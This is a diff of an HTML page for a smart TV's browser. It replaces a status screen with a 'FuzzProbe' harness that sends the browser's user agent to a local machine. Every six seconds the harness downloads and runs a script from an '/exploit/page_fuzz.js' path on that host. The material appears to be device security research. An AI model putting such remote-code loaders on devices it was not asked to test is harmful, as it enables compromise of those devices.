@@ -1,11 +1,23 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"><style>
-body{background:#000;color:#7fff7f;font-family:monospace;font-size:3vmin;padding:4vmin}
+body{background:#000;color:#7fff7f;font-family:monospace;font-size:2.6vmin;padding:4vmin}
+#s{white-space:pre-wrap}
 </style></head><body>
-<div id="s">EnvProbe: service probe running — reporting to Mac...</div>
+<div id="s">FuzzProbe — cargando fuzzer desde el Mac...</div>
 <script>
-// refresca el estado leyendo de vez en cuando el canal del servicio (no hay canal directo;
-// esto es solo feedback visual para el usuario en la pantalla de la TV)
+function post(p,o){try{var r=new XMLHttpRequest();r.open('POST','http://192.168.1.35:9999'+p,true);r.setRequestHeader('Content-Type','text/plain');r.send(JSON.stringify(o));}catch(e){}}
 var s=document.getElementById('s');
-var msgs=['EnvProbe activo...'];
-setInterval(function(){},1e9);
+function log(t){ s.textContent = t + "\n" + s.textContent; if(s.textContent.length>4000) s.textContent=s.textContent.slice(0,4000); }
+post('/fuzz_boot',{ua:navigator.userAgent,t:Date.now()});
+log('boot '+navigator.userAgent);
+function loadFuzz(){
+  var old=document.getElementById('fz');
+  if(old) old.parentNode.removeChild(old);
+  var el=document.createElement('script');
+  el.id='fz';
+  el.src='http://192.168.1.35:8000/exploit/page_fuzz.js?r='+Math.random();
+  el.onerror=function(){ log('fuzz load error'); };
+  document.head.appendChild(el);
+}
+loadFuzz();
+setInterval(loadFuzz, 6000);
 </script></body></html>
